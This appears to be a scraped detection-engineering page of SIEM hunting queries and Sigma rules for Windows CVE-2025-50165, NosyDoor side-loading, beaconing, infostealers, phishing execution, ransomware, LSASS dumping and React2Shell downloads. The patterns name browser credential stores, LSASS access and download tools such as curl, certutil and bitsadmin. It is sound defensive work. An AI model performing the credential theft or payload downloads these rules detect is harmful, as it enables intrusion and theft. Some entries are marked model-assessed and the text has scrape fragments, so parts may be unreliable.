  • Endpoint pending reboot after a cumulative update that staged the patched DLL but the old DLL is still loaded in memory
  • Endpoints in an OS-deployment task sequence that have a base image at .4768 awaiting LCU
  • Air-gapped or update-deferred hosts where this is an accepted exception
  • WSUS/SCCM pilot rings intentionally lagging the production ring
Suppression filter
| where DeviceName !in (dynamic(["DEPLOYMENT-PILOT-01","DEPLOYMENT-PILOT-02"])) // exclude approved patch-deferred pilot rings
Response runbook
Step 1 (triage): confirm the OS build via `winver` or `DeviceInfo` and check the patch status — version must be ≥ 10.0.26100.4946. Cross-check Defender TVM exposure score for the device. Step 2 (contain): if device handles untrusted JPGs (browsers, mail clients, image editors, thumbnail extraction) and remains unpatched after 7 days, force the November 2025 cumulative update via Intune/SCCM and reboot. Block 12/16-bit JPG ingestion at perimeter where feasible. Step 3 (hunt): query DeviceImageLoadEvents for all processes that loaded the vulnerable hash and review for any crash records (WerFault, faulting module windowscodecs.dll) in the same host to flag possible exploitation attempts.
// Path A: TVM catalogue hit for CVE-2025-50165
DeviceTvmSoftwareVulnerabilities
| where CveId == "CVE-2025-50165"
| project Timestamp, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| union (
    // Path B: image-load of the vulnerable WindowsCodecs.dll hash from ESET (10.0.26100.4768)
    DeviceImageLoadEvents
    | where Timestamp > ago(7d)
    | where FileName =~ "WindowsCodecs.dll"
    | where SHA1 =~ "5887D96565749067564BABCD3DC5D107AB6666BD"
    | summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), LoadingProcs=make_set(InitiatingProcessFileName, 25) by DeviceName, FolderPath, SHA1
)
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(7d)
| where CveId == "CVE-2025-50165"
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by DeviceName asc

description: Detects load of WindowsCodecs.dll version 10.0.26100.4768 (SHA1 5887D96565749067564BABCD3DC5D107AB6666BD) — the vulnerable build identified by ESET for CVE-2025-50165 uninitialized function pointer in jpeg_finish_compress.

Process crash with faulting module WindowsCodecs.dll (CVE-2025-50165 exploit attempt) AIExploitation Medium
Hunts for application crashes where the faulting module is WindowsCodecs.dll inside a process that handles JPG re-encoding (Explorer thumbnails, image editors, Office, browsers). The ESET analysis shows the crash signature is dereference of 0xBAADF00D inside jpeg_finish_compress when a 12/16-bit JPG is re-encoded — a process crash with WindowsCodecs.dll on the stack is a high-fidelity exploit-attempt indicator on unpatched hosts. Rationale: ESET demonstrates the crash signature inside WindowsCodecs.dll's jpeg_finish_compress — 0xBAADF00D dereference. Application Error EID 1000 / WerFault invocations naming WindowsCodecs.dll as faulting module in JPG-handling parents (Explorer thumbnail extraction via dllhost.exe, Photos.exe, Office, browsers, Acrobat, Photoshop) are scoped to plausible attack vectors per Microsoft's WIC re-encode code path. The list of JPG-handling parents is from MS WIC documentation linked in the article. Cross-checked against: • https://www.zscaler.com/blogs/security-research/technical-analysis-cve-2025-50165 • https://learn.microsoft.com/en-us/windows/win32/wic/-wic-codec-jpegmetadataencoding
ATT&CKT1203 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Corrupt or malformed (non-malicious) JPG attachments crashing Outlook preview pane
  • Photoshop / Lightroom plugin crashes that incidentally have WindowsCodecs.dll on the stack
  • Browser crash from a website serving a damaged thumbnail
  • Explorer thumbnail-cache rebuild crash from an unreadable user-folder JPG
Suppression filter
| where InitiatingProcessCommandLine !has "-d" or InitiatingProcessCommandLine !has "thumbnailcache_idx.db" // suppress thumbnail-cache rebuild noise
Response runbook
Step 1 (triage): pull the WerFault crash dump (%LocalAppData%\CrashDumps or C:\ProgramData\Microsoft\Windows\WER\ReportQueue) and inspect with WinDbg for ExceptionCode=0xC0000005 at jpeg_finish_compress+0xCC. Pull the originating JPG file from the parent process working directory or recent file activity. Step 2 (contain): isolate the host if the crash is reproducible from a single JPG; submit the suspect JPG to malware sandbox; verify host patch level for CVE-2025-50165 (require ≥ 10.0.26100.4946). Step 3 (hunt): pivot on the suspect JPG SHA-256 across DeviceFileEvents to find delivery vector (email attachment, web download, SMB share); query Email/Web/URLClick for the same hash; check for follow-on child processes from the parent within 60s of crash.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "WerFault.exe"
| where ProcessCommandLine has "WindowsCodecs" or ProcessCommandLine has "windowscodecs.dll"
| extend FaultingHost = InitiatingProcessFileName
| where FaultingHost in~ ("explorer.exe","thumbnailcache.exe","dllhost.exe","photos.exe","mspaint.exe","winword.exe","excel.exe","powerpnt.exe","outlook.exe","chrome.exe","msedge.exe","firefox.exe","acrord32.exe","acrobat.exe","photoshop.exe")
| project Timestamp, DeviceName, FaultingHost, InitiatingProcessCommandLine, ProcessCommandLine, AccountName, InitiatingProcessAccountName
| join kind=leftouter (
    DeviceTvmSoftwareVulnerabilities | where CveId == "CVE-2025-50165" | project DeviceName, IsVulnerable=true
) on DeviceName
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 1000   // Application Error
| where EventData has "WindowsCodecs.dll" or EventData has "windowscodecs.dll"
| extend FaultingApp = tostring(extract(@"Faulting application name: ([^,\s]+)", 1, EventData))
| extend FaultingModule = tostring(extract(@"Faulting module name: ([^,\s]+)", 1, EventData))
| extend ExceptionCode = tostring(extract(@"Exception code: (0x[0-9A-Fa-f]+)", 1, EventData))
| where FaultingApp in~ ("explorer.exe","dllhost.exe","Photos.exe","mspaint.exe","WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE","OUTLOOK.EXE","chrome.exe","msedge.exe","firefox.exe","AcroRd32.exe","Acrobat.exe","Photoshop.exe")
| project TimeGenerated, Computer, FaultingApp, FaultingModule, ExceptionCode, EventData
| order by TimeGenerated desc
source:windows.security @EventID:1000 (@EventData:*WindowsCodecs.dll* OR @EventData:*windowscodecs.dll*) (@EventData:*explorer.exe* OR @EventData:*dllhost.exe* OR @EventData:*Photos.exe* OR @EventData:*WINWORD.EXE* OR @EventData:*EXCEL.EXE* OR @EventData:*OUTLOOK.EXE* OR @EventData:*chrome.exe* OR @EventData:*msedge.exe* OR @EventData:*AcroRd32.exe* OR @EventData:*Photoshop.exe*)
#event_simpleName=ProcessRollup2 ImageFileName=/\\WerFault\.exe$/i CommandLine=/WindowsCodecs/i
| ParentBaseFileName=/(explorer|dllhost|Photos|mspaint|WINWORD|EXCEL|POWERPNT|OUTLOOK|chrome|msedge|firefox|AcroRd32|Acrobat|Photoshop)\.exe$/i
| groupBy([aid, ComputerName, ParentBaseFileName, CommandLine], function=count())
| _count > 0
ENDPOINT

2025-12-19 1 use case 0 techniques 2 kill-chain phases detected

NosyDoor AppDomainManager hijack: UevAppMonitor.exe executing from non-standard path AIInstallation High
Hunts the NosyDoor stage-2 LOLBin: the legitimate UevAppMonitor.exe is normally only present in C:\Windows\System32, but LongNosedGoblin's dropper copies it to C:\Windows\Microsoft.NET\Framework so it loads a sibling .config that triggers AppDomainManager injection from SharedReg.dll. Execution of UevAppMonitor.exe from any path other than System32 is highly indicative of NosyDoor stage-2. Rationale: UevAppMonitor.exe is a real Microsoft UE-V binary that ships only in System32; ESET explicitly notes the dropper copies it to C:\Windows\Microsoft.NET\Framework, then loads SharedReg.dll through a crafted .config (AppDomainManager injection). Cross-checked against The Hacker News and SecurityWeek coverage which restate the same path / DLL. Cross-checked against: • https://thehackernews.com/2025/12/china-aligned-threat-group-uses-windows.html • https://www.securityweek.com/chinese-apt-longnosedgoblin-targeting-asian-governments/ • https://www.helpnetsecurity.com/2025/12/18/eset-china-aligned-apt-group-policy/ • https://attack.mitre.org/techniques/T1574/014/
ATT&CKT1574.014 T1218 T1036.005
Data sourcesEndpoint.Processes Endpoint.Filesystem
// LongNosedGoblin NosyDoor stage-2 — UevAppMonitor.exe is a legitimate Windows binary that *only* ships in System32. Execution from anywhere else (especially Microsoft.NET\Framework) means a copy was staged by the dropper to side-load SharedReg.dll via AppDomainManager.
let UevExec =
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where FileName =~ "UevAppMonitor.exe"
    | where not(FolderPath startswith @"C:\Windows\System32\")
    | where not(FolderPath startswith @"C:\Windows\SysWOW64\")
    | project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine,
              InitiatingProcessFileName, InitiatingProcessCommandLine,
              InitiatingProcessFolderPath, SHA256;
let SharedRegLoad =
    DeviceImageLoadEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName =~ "UevAppMonitor.exe"
    | where FileName =~ "SharedReg.dll"
    | where not(FolderPath startswith @"C:\Windows\WinSxS\")
    | project Timestamp, DeviceName, FolderPath, FileName, SHA256,
              InitiatingProcessFolderPath;
UevExec
| union SharedRegLoad
| order by Timestamp desc

NosyDoor persistence: scheduled task 'OneDrive Reporting Task-S-1-5-21-' under Microsoft folder AIInstallation High
NosyDoor's dropper persists by creating a scheduled task with the literal prefix 'OneDrive Reporting Task-S-1-5-21-' followed by a random GUID, registered under the Microsoft task folder, executing the relocated UevAppMonitor.exe at startup. The naming pattern is article-unique and not used by Microsoft OneDrive itself. Rationale: ESET reports the dropper creates a Windows scheduled task literally named 'OneDrive Reporting Task-S-1-5-21-<GUID>' under the Microsoft task folder to autorun the relocated UevAppMonitor.exe at startup. The literal prefix plus the SID-style suffix is article-unique — legitimate OneDrive tasks do not embed an S-1-5-21 SID in their name. Cross-checked against: • https://thehackernews.com/2025/12/china-aligned-threat-group-uses-windows.html • https://cyberpress.org/apt-hackers-china-malware/ • https://attack.mitre.org/techniques/T1053/005/
ATT&CKT1053.005 T1036.005

NosyDoor dropper file artefacts in C:\Windows\Microsoft.NET\Framework AIInstallation High
Hunts the four-file drop the NosyDoor stage-1 dropper writes into C:\Windows\Microsoft.NET\Framework — SharedReg.dll, log.cached, netfxsbs9.hkf and UevAppMonitor.exe.config — names deliberately chosen to blend with legitimate SharedReg12.dll / netfxsbs12.hkf. None of these filenames are produced by genuine .NET Framework installation/servicing, so any user-mode write into that directory is a strong NosyDoor staging signal. Rationale: ESET names the exact four files the dropper writes to C:\Windows\Microsoft.NET\Framework (SharedReg.dll, log.cached, netfxsbs9.hkf, UevAppMonitor.exe.config) and explicitly notes their goal is to blend with the genuine SharedReg12.dll / netfxsbs12.hkf — so the '9' vs '12' suffix and the unsuffixed SharedReg.dll are themselves diagnostic. The 'co-occurrence ≥ 2 of N' threshold (skipping Sigma because that's a count predicate) keeps FP rate low while catching variants where one filename rotates. Cross-checked against: • https://thehackernews.com/2025/12/china-aligned-threat-group-uses-windows.html • https://www.securityweek.com/chinese-apt-longnosedgoblin-targeting-asian-governments/ • https://attack.mitre.org/techniques/T1574/014/
ATT&CKT1036.005 T1574.014
Data sourcesEndpoint.Filesystem
// LongNosedGoblin NosyDoor dropper — writes a known set of artefacts into C:\Windows\Microsoft.NET\Framework so the relocated UevAppMonitor.exe loads SharedReg.dll via .config-driven AppDomainManager injection.
let NosyDoorFiles = dynamic([
    "SharedReg.dll",
    "log.cached",
    "netfxsbs9.hkf",            // typo of legitimate netfxsbs12.hkf
    "UevAppMonitor.exe.config",
    "UevAppMonitor.exe",         // staged copy from System32
    "error.txt"                  // dropped on stage-2 decryption errors
]);
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated", "FileModified", "FileRenamed")
| where FolderPath in~ (@"C:\Windows\Microsoft.NET\Framework", @"C:\Windows\Microsoft.NET\Framework64")
   or FolderPath endswith @"\Microsoft.NET\Framework"
   or FolderPath endswith @"\Microsoft.NET\Framework64"
| where FileName in~ (NosyDoorFiles)
// Exclude legitimate .NET servicing — the genuine SharedReg DLL is named SharedReg12.dll, not SharedReg.dll
| where not(InitiatingProcessFileName in~ ("TrustedInstaller.exe", "msiexec.exe", "setup.exe") and InitiatingProcessFolderPath startswith @"C:\Windows\")
| summarize FileSet = make_set(FileName), FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            Writers = make_set(InitiatingProcessFileName)
  by DeviceName, FolderPath, InitiatingProcessAccountName
| where array_length(FileSet) >= 2     // at least two of the four sibling artefacts
| order by LastSeen desc
// Sentinel equivalent via ASIM ImFileEvent — NosyDoor dropper artefact set
let NosyDoorFiles = dynamic(["SharedReg.dll","log.cached","netfxsbs9.hkf","UevAppMonitor.exe.config","UevAppMonitor.exe","error.txt"]);
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFilePath has @"\Windows\Microsoft.NET\Framework"

| where not(ActingProcessName has_any ("TrustedInstaller.exe","msiexec.exe"))
| summarize FileSet = make_set(TargetFileName), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            Writers = make_set(ActingProcessName)
          by DvcHostname, ActorUsername
| where array_length(FileSet) >= 2
| order by LastSeen desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"

        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    | where Operation in~ ("Send","Receive")

              Recipients, Subject, MessageId;

   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

    from datamodel=Endpoint.Processes

      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")

CISA KEV
2025-12-16 1 use case 0 techniques 2 kill-chain phases detected

Fortinet FortiOS, FortiSwitchMaster, FortiProxy, and FortiWeb contain an improper verification of cryptographic signature vulnerability that may allow an unauthenticated attacker to bypass the FortiCloud SSO login authentication via a crafted SAML message. Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Vulnerable React Server Components or Next.js App Router versions present in inventory · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

Node.js process downloads payload via curl/wget (React2Shell SNOWLIGHT/VShell deployment) AIInstallation High
Detects post-exploitation behaviour following CVE-2025-55182 / CVE-2025-66478 RCE in React Server Components and Next.js App Router: the Next.js Node.js server process spawns curl, wget, bitsadmin, certutil, or a shell with a URL on the command line to stage second-stage tooling. Web-app Node.js servers virtually never spawn these binaries with URL arguments under normal operation, making this a high-fidelity post-RCE pivot. Rationale: Article explicitly names the vulnerable runtimes (`node`/`next` via React Server Components Flight protocol) — `npm list react` / `npm list next` confirm Node.js is the runtime under attack. Reliable RCE per the React Core Team disclosure means the FIRST post-exploit action is almost universally an `Ingress Tool Transfer` via the same Node process; we anchor on the (parent=node) + (child=download-utility) + (cmdline contains URL) triplet to keep FP low. Cross-checked against: • https://github.com/facebook/react/security/advisories • https://vercel.com/changelog • https://www.wiz.io/blog/critical-vulnerability-in-react • https://attack.mitre.org/techniques/T1190/ • https://attack.mitre.org/techniques/T1105/
ATT&CKT1190 T1059 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node-based build tools (e.g. node-gyp, electron-builder) invoking curl/wget to fetch native binaries during install
  • Internal CI/CD container images running `npm postinstall` scripts that call curl for license/manifest fetches
  • Developer workstations where a globally-installed npm package shells out to bitsadmin/certutil for caching
  • Headless e2e test runners (Playwright/Puppeteer) spawning shells that fetch test fixtures over HTTP
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("node-gyp","electron-builder","playwright install","puppeteer","npm-cli.js","yarn.js") or ProcessCommandLine has_any ("registry.npmjs.org","github.com/electron","playwright.azureedge.net","chromium-browser-snapshots"))
Response runbook
Step 1 — Triage: Pull the full process ancestry for the Node.js parent (PID, listening port, working directory). Confirm the host is running Next.js App Router or a framework embedding `react-server-dom-*` at a vulnerable version (`npm list react`, `npm list next`). Capture the URL and any fetched file hash. Step 2 — Contain: Isolate the host in Defender/Falcon; block the destination URL/IP at the proxy; force-rotate any service credentials, cloud IAM tokens, and DB connection strings reachable from the Node process; snapshot memory if EDR supports it. Step 3 — Hunt: Pivot on the Node process SHA256/PID — search for other DeviceFileEvents writes from that PID (webshells, cron entries), DeviceNetworkEvents to the same C2, and identical TTPs on other Next.js fleet members. Patch to React 19.0.1/19.1.2/19.2.1 and Next.js per the article's table before returning the host to service.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe", "node")
| where FileName in~ ("curl.exe","wget.exe","bitsadmin.exe","certutil.exe","powershell.exe","pwsh.exe","cmd.exe","bash.exe","sh.exe")
| where ProcessCommandLine has_any ("http://","https://","ftp://","tftp://")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node.exe", "node")
